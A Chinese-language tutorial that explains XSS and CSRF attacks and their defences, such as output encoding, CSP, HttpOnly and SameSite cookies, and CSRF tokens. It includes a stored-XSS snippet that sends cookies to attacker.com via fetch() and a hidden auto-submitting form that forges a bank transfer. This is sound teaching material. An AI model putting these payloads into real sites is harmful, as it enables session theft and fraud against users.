---
title: "XSS与CSRF攻击与防御"
date: 2026-07-10
description: "跨站脚本(XSS)和跨站请求伪造(CSRF)的原理与防护"
---

## XSS（跨站脚本攻击）

### 什么是 XSS

攻击者将恶意 JavaScript 代码注入网页，当其他用户访问该页面时，脚本在用户浏览器中执行。

### XSS 的三种类型

| 类型 | 攻击方式 | 危害等级 |
|------|---------|---------|
| **反射型 XSS** | 恶意脚本通过 URL 参数传入，服务端直接回显 | 中 |
| **存储型 XSS** | 恶意脚本存储在数据库（评论、昵称），每次展示都触发 | **高** |
| **DOM型 XSS** | 纯前端漏洞，JS 将用户输入插入 DOM 时未转义 | 中 |

### 攻击示例

```html
<!-- 用户在某论坛的评论中写入 -->
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- 这段评论存在数据库里，每个看帖的人都会被偷走 Cookie -->
```

### XSS 能做多可怕的事

- 窃取 Cookie → 以你的身份登录
- 伪造页面 → 诱导你输入密码
- 键盘记录 → 记录你打的所有字
- 扫描内网 → 以你为跳板攻击内网

### 防御 XSS

1. **输出编码（最重要）**
   ```python
   from html import escape
   safe_content = escape(user_content)  # < 变成 &lt;
   ```

2. **CSP（内容安全策略）**
   ```html
   <meta http-equiv="Content-Security-Policy"
         content="script-src 'self'; object-src 'none'">
   ```
   告诉浏览器只执行来自本站的 JS，彻底阻断内联脚本。

3. **HttpOnly Cookie**
   ```
   Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
   ```
   HttpOnly 的 Cookie JS 读不到，即使有 XSS 也偷不走。

4. **前端框架自动转义**
   React、Vue、Angular 默认对 `{}` 内的数据做转义。

## CSRF（跨站请求伪造）

### 什么是 CSRF

攻击者诱导用户在已登录的网站 A 上执行非本意的操作。

```
1. 你登录了 bank.com（Cookie 有效）
2. 你在另一个标签页打开 hacker.com
3. hacker.com 的页面里有一个隐藏的 form：
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="hacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 浏览器带着你的 Cookie 向 bank.com 发起了转账请求
5. 钱被转走了，而你完全不知道
```

### 防御 CSRF

1. **CSRF Token**
   ```html
   <form>
     <input type="hidden" name="csrf_token" value="{{ random_token }}">
   </form>
   ```
   服务端验证表单中的 token 与会话中的是否一致。

2. **SameSite Cookie**
   ```
   Set-Cookie: session=xxx; SameSite=Strict
   ```
   跨站请求不会携带 Cookie，从根本上阻断 CSRF。

3. **验证 Referer / Origin 头**
   检查请求来源是否为本域名。

4. **关键操作二次验证**
   转账、修改密码等敏感操作要求输入密码或验证码。

## XSS vs CSRF 的区别

| | XSS | CSRF |
|---|-----|------|
| 利用目标 | 用户的信任（对网站）| 网站的信任（对用户）|
| 执行位置 | 受害者的浏览器 | 受害者的浏览器 |
| 核心危害 | 执行任意JS | 伪造用户操作 |
| 防御关键 | 输出编码 | Token + SameSite |
